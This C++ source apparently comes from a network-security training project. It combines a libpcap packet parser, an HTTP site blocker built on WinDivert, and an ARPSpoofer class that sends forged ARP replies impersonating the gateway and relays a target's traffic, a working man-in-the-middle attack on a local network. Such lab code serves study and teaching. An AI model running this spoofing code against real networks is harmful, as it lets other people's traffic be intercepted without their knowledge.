#pragma once
#include "tangu_analyzer.hpp"

PacketInfo::PacketInfo(void)
	: _DumpFiltered(""), _No(0), _PacketData(nullptr)
{

}

Common::Common(pcap_t* Interface)
{
	_Interface = Interface;
}
ARPAnalyzer::ARPAnalyzer(pcap_t* Interface)
{
	_Interface = Interface;
}

const string& Common::PktParser(const BYTE* PacketData, PKTBEGIN Stage)
{
	_DumpContent.clear();

	switch (Stage)
	{
	case PKTBEGIN::LAYER_DATALINK:
		goto L2;

	case PKTBEGIN::LAYER_NETWORK:
		goto L3;

	case PKTBEGIN::LAYER_TRANSPORT:
		goto L4;
	}

L2:	/* TCP/IP PktBegin 2 : Data Link PktBegin { Ethernet } */

	memcpy(_MyEthernet.Destination, PacketData, 6);
	memcpy(_MyEthernet.Source, PacketData + 6, 6);
	_MyEthernet.Type = Packet::Utility::Trace(PacketData + 12, 2);

	_DumpContent += "┌────────────────────────────────┐\n";

	Packet::Utility::CustomPermutate(_DumpContent, "│   [Source MAC]   %02x:%02x:%02x:%02x:%02x:%02x                             │\n",
		_MyEthernet.Source[0], _MyEthernet.Source[1], _MyEthernet.Source[2], _MyEthernet.Source[3], _MyEthernet.Source[4], _MyEthernet.Source[5]);

	Packet::Utility::CustomPermutate(_DumpContent, "│[Destination MAC] %02x:%02x:%02x:%02x:%02x:%02x                             │\n",
		_MyEthernet.Destination[0], _MyEthernet.Destination[1], _MyEthernet.Destination[2], _MyEthernet.Destination[3], _MyEthernet.Destination[4], _MyEthernet.Destination[5]);

	PacketData = PacketData + sizeof(Packet::ETHERNET_HEADER);
	_DumpContent += "│      [Type]      ";
	switch (static_cast<Packet::ETHERNET_HEADER::EthernetType> (htons(_MyEthernet.Type)))
	{
	case Packet::ETHERNET_HEADER::EthernetType::ARP:
		_DumpContent += "Address Resolution Protocol (ARP) ";
		_ARPFrame.HardwareType = Packet::Utility::Trace(PacketData, 2);
		_ARPFrame.ProtocolType = Packet::Utility::Trace(PacketData + 2, 2);
		_ARPFrame.MACLen = Packet::Utility::Trace(PacketData + 4, 1);
		_ARPFrame.IPLen = Packet::Utility::Trace(PacketData + 5, 1);
		_ARPFrame.Operation = Packet::Utility::Trace(PacketData + 6, 2);

		memcpy(_ARPFrame.SenderMAC, PacketData + 8, SIZ_HARDWARE);
		memcpy(_ARPFrame.SenderIP, PacketData + 14, SIZ_PROTOCOL);
		memcpy(_ARPFrame.TargetMAC, PacketData + 18, SIZ_HARDWARE);
		memcpy(_ARPFrame.TargetIP, PacketData + 24, SIZ_PROTOCOL);

		goto Exit;

	case Packet::ETHERNET_HEADER::EthernetType::IPV4:
		_DumpContent += "Internet Protocol Version 4 (IPv4)";
		break;

	}
	Packet::Utility::CustomPermutate(_DumpContent, " (0x%04x)   │\n", _MyEthernet.Type);
	_DumpContent += "└────────────────────────────────┘\n";


L3: /* TCP/IP PktBegin 3 : Internet PktBegin { IPv4 }*/

	_MyIP.IHL = Packet::Utility::Trace(PacketData, 1);
	_MyIP.ServiceType = Packet::Utility::Trace(PacketData + 1, 1);
	_MyIP.TotalLength = (Packet::Utility::Trace(PacketData + 2, 2));
	_MyIP.ldentification = (Packet::Utility::Trace(PacketData + 4, 2));

	_MyIP.Fragmention = (Packet::Utility::Trace(PacketData + 6, 2));
	_MyIP.TTL = Packet::Utility::Trace(PacketData + 8, 1);
	_MyIP.Protocol = Packet::Utility::Trace(PacketData + 9, 1);
	_MyIP.Checksum = (Packet::Utility::Trace(PacketData + 10, 2));
	memcpy(_MyIP.SrcIP, PacketData + 12, SIZ_PROTOCOL);
	memcpy(_MyIP.DestIP, PacketData + 16, SIZ_PROTOCOL);

	_DumpContent += "┌────────────────────────────────┐\n";
	Packet::Utility::CustomPermutate(_DumpContent, "│   [Source  IP]   %3i.%3i.%3i.%3i                               │\n",
		_MyIP.SrcIP[0], _MyIP.SrcIP[1], _MyIP.SrcIP[2], _MyIP.SrcIP[3]);
	Packet::Utility::CustomPermutate(_DumpContent, "│ [Destination IP] %3i.%3i.%3i.%3i                               │\n",
		_MyIP.DestIP[0], _MyIP.DestIP[1], _MyIP.DestIP[2], _MyIP.DestIP[3]);

	_DumpContent += "│    [Protocol]    ";
	PacketData = PacketData + sizeof(Packet::IP_HEADER);
	switch (static_cast<Packet::IP_HEADER::IPProto>(_MyIP.Protocol))
	{
	case Packet::IP_HEADER::IPProto::ICMP:
		_DumpContent += "ICMP   ";

		_ICMPPacket.Type = Packet::Utility::Trace(PacketData, 1);
		_ICMPPacket.Code = Packet::Utility::Trace(PacketData + 1, 1);
		_ICMPPacket.Checksum = Packet::Utility::Trace(PacketData + 2, 2);
		_ICMPPacket.Identifier = Packet::Utility::Trace(PacketData + 4, 2);
		_ICMPPacket.Sequence = Packet::Utility::Trace(PacketData + 6, 2);

		memcpy(_ICMPPacket.Data, "abcdefghijklmnopqrstuvwabcdfghi", 32);

		goto Exit;

	case Packet::IP_HEADER::IPProto::TCP:
		_DumpContent += "Transmission Control Protocol (TCP)";
		break;

	case Packet::IP_HEADER::IPProto::USER_DATAGRAM:
		_DumpContent += "User Datagram Protocol (UDP)";
		goto Exit;

	default:
		_DumpContent += "UNKNOWN";
		goto Exit;
	}
	Packet::Utility::CustomPermutate(_DumpContent, " (0x%02x)                                │\n", _MyIP.Protocol);
	_DumpContent += "└────────────────────────────────┘\n";


L4: /* TCP/IP PktBegin 4 : Transport PktBegin { TCP }*/

	_MyTCP.SrcPort = Packet::Utility::Trace(PacketData, 2);
	_MyTCP.DstPort = Packet::Utility::Trace(PacketData + 2, 2);
	_MyTCP.Sequence = Packet::Utility::Trace(PacketData + 4, 4);
	_MyTCP.Acknowledgemnet = Packet::Utility::Trace(PacketData + 8, 4);

	_MyTCP.FHL = Packet::Utility::Trace(PacketData + 12, 2);
	_MyTCP.WindowSize = Packet::Utility::Trace(PacketData + 14, 2);
	_MyTCP.Checksum = Packet::Utility::Trace(PacketData + 16, 2);
	_MyTCP.UrgentPointer = Packet::Utility::Trace(PacketData + 18, 2);

	_DumpContent += "┌────────────────────────────────┐\n";
	Packet::Utility::CustomPermutate(_DumpContent, "│   [Source  Port]   %5i                               │\n", _MyTCP.SrcPort);
	Packet::Utility::CustomPermutate(_DumpContent, "│ [Destination Port] %5i                               │\n", _MyTCP.DstPort);
	_DumpContent += "└────────────────────────────────┘\n";

	PacketData = PacketData + (((_MyTCP.FHL >> 12) & 0x07) * 4); // sizeof(Packet::TCP_HEADER) + TCP Options' size 
	switch (static_cast<Packet::TCP_HEADER::Port>(_MyTCP.DstPort))
	{
	case Packet::TCP_HEADER::Port::HTTP:
		_HTTP = (CHAR*)PacketData;
	}

Exit: return _DumpContent;
}

const string& ARPAnalyzer::PktParser(const BYTE* PacketData, PKTBEGIN Stage)
{
	_DumpContent.clear();
	_No = _No + 1;

	// Data Link PktBegin (L2)

	memcpy(_MyEthernet.Destination, PacketData, 6);
	memcpy(_MyEthernet.Source, PacketData + 6, 6);
	_MyEthernet.Type = Packet::Utility::Trace(PacketData + 12, 2);

	if (_MyEthernet.Type != UCast(16)(Packet::ETHERNET_HEADER::EthernetType::ARP))
	{
		return _DumpFiltered;
	}

	_DumpContent += "┌────────────────────────────────┐\n";

	Packet::Utility::CustomPermutate(_DumpContent, "│   [Source MAC]   %02x:%02x:%02x:%02x:%02x:%02x                             │\n",
		_MyEthernet.Source[0], _MyEthernet.Source[1], _MyEthernet.Source[2], _MyEthernet.Source[3], _MyEthernet.Source[4], _MyEthernet.Source[5]);

	Packet::Utility::CustomPermutate(_DumpContent, "│[Destination MAC] %02x:%02x:%02x:%02x:%02x:%02x                             │\n",
		_MyEthernet.Destination[0], _MyEthernet.Destination[1], _MyEthernet.Destination[2], _MyEthernet.Destination[3], _MyEthernet.Destination[4], _MyEthernet.Destination[5]);

	_DumpContent += "│      [Type]      Address Resolution Protocol (ARP) ";
	Packet::Utility::CustomPermutate(_DumpContent, " (0x%04x)   │\n", _MyEthernet.Type);
	_DumpContent += "└────────────────────────────────┘\n";

	PacketData = PacketData + 14;

	memcpy(&_ARPFrame, PacketData, sizeof(Packet::ARP_ARCH));

	_ARPFrame.HardwareType = htons(_ARPFrame.HardwareType);
	_ARPFrame.ProtocolType = htons(_ARPFrame.ProtocolType);
	_ARPFrame.Operation = htons(_ARPFrame.Operation);

	_DumpContent += "┌────────────────────────────────┐\n";
	Packet::Utility::CustomPermutate(_DumpContent, "│ [Hardware  Type] %i                                             │\n", _ARPFrame.HardwareType);
	Packet::Utility::CustomPermutate(_DumpContent, "│ [Protocol  Type] %i                                          │\n", _ARPFrame.ProtocolType);
	Packet::Utility::CustomPermutate(_DumpContent, "│ [Hardware  Size] %i                                             │\n", _ARPFrame.MACLen);
	Packet::Utility::CustomPermutate(_DumpContent, "│ [Protocol  Size] %i                                             │\n", _ARPFrame.IPLen);
	Packet::Utility::CustomPermutate(_DumpContent, "│ [    Opcode    ] %i                                             │\n", _ARPFrame.Operation);

	Packet::Utility::CustomPermutate(_DumpContent, "│   [Sender MAC]   %02x:%02x:%02x:%02x:%02x:%02x                             │\n",
		_ARPFrame.SenderMAC[0], _ARPFrame.SenderMAC[1], _ARPFrame.SenderMAC[2], _ARPFrame.SenderMAC[3], _ARPFrame.SenderMAC[4], _ARPFrame.SenderMAC[5]);
	Packet::Utility::CustomPermutate(_DumpContent, "│   [Sender  IP]   %3i.%3i.%3i.%3i                               │\n",
		_ARPFrame.SenderIP[0], _ARPFrame.SenderIP[1], _ARPFrame.SenderIP[2], _ARPFrame.SenderIP[3]);
	Packet::Utility::CustomPermutate(_DumpContent, "│   [Target MAC]   %02x:%02x:%02x:%02x:%02x:%02x                             │\n",
		_ARPFrame.TargetMAC[0], _ARPFrame.TargetMAC[1], _ARPFrame.TargetMAC[2], _ARPFrame.TargetMAC[3], _ARPFrame.TargetMAC[4], _ARPFrame.TargetMAC[5]);
	Packet::Utility::CustomPermutate(_DumpContent, "│   [Sender  IP]   %3i.%3i.%3i.%3i                               │\n",
		_ARPFrame.TargetIP[0], _ARPFrame.TargetIP[1], _ARPFrame.TargetIP[2], _ARPFrame.TargetIP[3]);

	_DumpContent += "└────────────────────────────────┘\n";

	return _DumpContent;
}

const string& PacketInfo::DumpData(struct pcap_pkthdr* PacketHeader, const BYTE* PacketData, const USHORT OutputLength)
{
	_DumpContent.clear();

	for (bpf_u_int32 i = 1; i <= PacketHeader->caplen; i += OutputLength)
	{
		for (bpf_u_int32 j = i; j < i + OutputLength; ++j)
		{
			Packet::Utility::CustomPermutate(_DumpContent, "%.2x ", PacketData[j - 1]);
		}
		_DumpContent += "  ";

		for (bpf_u_int32 j = i; j < i + OutputLength; ++j)
		{
			Packet::Utility::CustomPermutate(_DumpContent, "%c", !(0x20 < PacketData[j - 1] && PacketData[j - 1] < 0x7F) ? '.' : PacketData[j - 1]);
		}
		_DumpContent += "\n";
	}

	return _DumpContent;
}

PcapTool::PcapTool(void)
{

}

NetInfo::NetInfo(pcap_t** Interface)
{
	_Interface = Interface;
}

Packet::ETHERNET_HEADER NetInfo::GetMACAddress(Net::IPInfo& TargetSpoof, DOUBLE TimeLimit)
{
	GenerateARP(Packet::ARP_ARCH::Opcode::REQUEST);

	ARPAnalyzer	ARPPacketCapturer(*_Interface);
	_PcapAnalyzer = &ARPPacketCapturer;

	time_point<system_clock> Start{ system_clock::now() };

	while ((_Ret = pcap_next_ex(*_Interface, &_PacketHeader, &_PacketData)) >= 0)
	{
		if (!_Ret)
		{
			continue;
		}

		_PcapAnalyzer->PktParser(_PacketData, PKTBEGIN::LAYER_DATALINK);
		if (ARPPacketCapturer._MyEthernet.Type == UCast(16)(Packet::ETHERNET_HEADER::EthernetType::ARP))
		{
			if (ARPPacketCapturer._ARPFrame.Operation != static_cast<USHORT>(Packet::ARP_ARCH::Opcode::REPLY))
			{
				continue;
			}
			if (!memcmp(ARPPacketCapturer._ARPFrame.SenderIP, *TargetSpoof, 4))
			{
				_CollectSuccess = true;
				break;
			}
		}

		if (duration<double>(system_clock::now() - Start).count() > TimeLimit)
		{

			_CollectSuccess = false;
			break;
		}
	}

	return ARPPacketCapturer._MyEthernet;
}

bool NetInfo::IsARPValid()
{
	return _CollectSuccess;
}
Net::MACInfo NetInfo::CollectNetworkInfo(Net::IPInfo& IPResource, DOUBLE TimeLimit)
{
	return GetMACAddress(IPResource, TimeLimit).Source;
}

void NetInfo::GenerateARP(Packet::ARP_ARCH::Opcode Operation)
{
	_ARPFrame.GetARP(Operation);
	pcap_sendpacket(*_Interface,
		_ARPFrame._Msg,
		sizeof(Packet::ETHERNET_HEADER) + sizeof(Packet::ARP_ARCH));
}


#include "tangu_spoof.hpp"

ARPSpoofer::ARPSpoofer(pcap_t** Interface, Net::IPInfo Target)
	: NetInfo(Interface)
{
	Net::IPAdapterInfo* AddressInfo = Net::IPAdapterInfo::GetInstance();

	_Gateway.second = Net::Utility::GetGatewayIPAddress(AddressInfo);
	_Gateway.first = CollectNetworkInfo(_Gateway.second, 30.0);
	_ARPFrame._Rsrc.ISrc = Net::Utility::GetIPAddress(AddressInfo);
	_ARPFrame._Rsrc.MSrc = Net::Utility::GetMACAddress(AddressInfo);
	_ARPFrame._Rsrc.IDst = Target;
	_ARPFrame._Rsrc.MDst = CollectNetworkInfo(_ARPFrame._Rsrc.IDst, 30.0);
}

void ARPSpoofer::Reply(void)
{
	_ARPFrame._Rsrc.ISrc = _Gateway.second;
	GenerateARP(Packet::ARP_ARCH::Opcode::REPLY);
}
void ARPSpoofer::Relay()
{
	BYTE Msg[1500];
	Common CommonPacketCapturer{ *_Interface };
	_PcapAnalyzer = &CommonPacketCapturer;

	while ((_Ret = pcap_next_ex(*_Interface, &_PacketHeader, &_PacketData)) >= 0)
	{
		if (!_Ret)
		{
			continue;
		}

		_PcapAnalyzer->PktParser(_PacketData, PKTBEGIN::LAYER_DATALINK);
		if (Net::MACInfo{ CommonPacketCapturer._MyEthernet.Source } == _ARPFrame._Rsrc.MDst)
		{
			if (Net::MACInfo{ CommonPacketCapturer._MyEthernet.Destination } == _ARPFrame._Rsrc.MSrc)
			{
				memcpy(Msg, _PacketData, _PacketHeader->len);
				memcpy(Msg, *(_Gateway.first), SIZ_HARDWARE);
				memcpy(Msg + 6, *(_ARPFrame._Rsrc.MSrc), SIZ_HARDWARE);

				pcap_sendpacket(*_Interface, Msg, _PacketHeader->len);
			}
		}
	}
}


#include "tangu_blocker.hpp"

BlackList::BlackList(const char* mal_site_txt) :
	MalformedList{ mal_site_txt, ios::in },
	LoggerMalsite{ "C:\\warning.log", ios::out }
{
	assert(LoggerMalsite.is_open());

	string Ban;
	It = BlockedURL.before_begin();
	while (MalformedList.good())
	{
		std::getline(MalformedList, Ban);

		boost::algorithm::erase_all(Ban, "http://");

#pragma warning(push)
#pragma warning(disable : 4566)
		boost::algorithm::erase_all(Ban, "\u00A0"); // gilgil gave me some strange unicodes, too!
#pragma warning(pop)
#if 0
		printf("%ws  \n", Ban.c_str());
#endif
		It = BlockedURL.insert_after(It, Ban);
	}
	MalformedList.close();

	time(&RawTime);
	localtime_s(&TimeInfo, &RawTime);
}
BlackList::~BlackList()
{
	LoggerMalsite.close();
}

void BlackList::LogAccessMalsite()
{
	strftime(TimeBuf, sizeof(TimeBuf), "%d-%m-%Y %H-%M-%S", &TimeInfo);
}

void BlackList::Add(string URL)
{
	It = BlockedURL.insert_after(It, URL);
}
bool BlackList::PayloadMatch(HTTPHeader HTTPPayload)
{
	HTTPParsedInfo.clear();

	std::istringstream Resp{ HTTPPayload };
	string Token;
	string::size_type Index;
	while (std::getline(Resp, Token))
	{
		Index = Token.find(':', 0);
		if (Index != string::npos)
		{
			HTTPParsedInfo.insert(make_pair(Token.substr(0, Index), Token.substr(Index + 1)));
		}
	}

	for (auto& Key : HTTPParsedInfo)
	{
		if (Key.first == "Host")
		{
			for (auto& Lock : BlockedURL)
			{
				if (Key.second.find(Lock) != string::npos)
				{
					LogAccessMalsite();
					LoggerMalsite << TimeBuf << ' ' << Lock << std::endl << std::flush;

					return false;
				}
			}
		}
	}

	return true;
}


WinDivertDev::WinDivertDev() :
	HDivertDev{ WinDivertOpen
	(
		"outbound && ip && tcp.DstPort == 80 && tcp.PayloadLength > 0",
		WINDIVERT_LAYER_NETWORK, 404, 0
	) }
{

}


bool WinDivertDev::IsValid()
{
	return HDivertDev == INVALID_HANDLE_VALUE;
}
BOOL WinDivertDev::Recv()
{
	return WinDivertRecv(HDivertDev, Packet, sizeof(Packet), &PAddr, &ReadLen);
}
BOOL WinDivertDev::Send()
{
	return WinDivertSend(HDivertDev, Packet, ReadLen, &PAddr, nullptr);
}


#include "tangu_interface.hpp"

PcapDevice::PcapDevice(bool(*IsMyDevice)(PPCAP_INTERFACE))
	: DeviceNum(0)
{
	Status = pcap_findalldevs(&FirstDevice, Error);
	if (PCAP_ERROR == Status)
	{
		goto PcapDevice_FAILED;
	}
	Device = FirstDevice;

	while (Device)
	{
		if (IsMyDevice(Device))
		{
			break;
		}
		Device = Device->next;
	}

	OpenLive(Device->name);

PcapDevice_FAILED:
	;
}
PcapDevice::PcapDevice(void)
{
	DeviceChar = pcap_lookupdev(Error);
	if (nullptr == DeviceChar)
	{
		goto PcapDevice_FAILED;
	}

	Status = pcap_lookupnet(DeviceChar, &Net, &Mask, Error);
	if (PCAP_ERROR == Status)
	{
		goto PcapDevice_FAILED;
	}

	struct in_addr NetAddress;
	struct in_addr MaskAddress;

	NetAddress.s_addr = Net;
	MaskAddress.s_addr = Mask;

	OpenLive(DeviceChar);
PcapDevice_FAILED:
	;
}
PcapDevice::~PcapDevice(void)
{
	if (nullptr != FirstDevice)
	{
		pcap_freealldevs(FirstDevice);
	}
	pcap_close(Interface);
}
void PcapDevice::OpenLive(CHAR* DeviceName)
{
	Interface = pcap_open_live(DeviceName, 65536, 1, 1000, Error);
}

bool IsMyDeviceWithAddress(PPCAP_INTERFACE Device)
{
	PPCAP_ADDRESS PcapAddress = Device->addresses;
	ADDRESS_FAMILY AddressFamily = PcapAddress->addr->sa_family;
	if (AF_INET == AddressFamily || AF_INET6 == AddressFamily)
	{
		if (PcapAddress->addr && PcapAddress->netmask)
		{
			Net::PIPAdapterInfo AddressInfo = Net::IPAdapterInfo::GetInstance();
			if (Net::Utility::GetIPAddress(AddressInfo) ==
				Net::IPInfo(((struct sockaddr_in*)(PcapAddress->addr))->sin_addr.s_addr))
			{
				return true;
			}
		}
	}
	return false;
}
bool IsMyDeviceWithDescription(PPCAP_INTERFACE Device)
{
	return string(Device->description) == "Microsoft" ? true : false;
}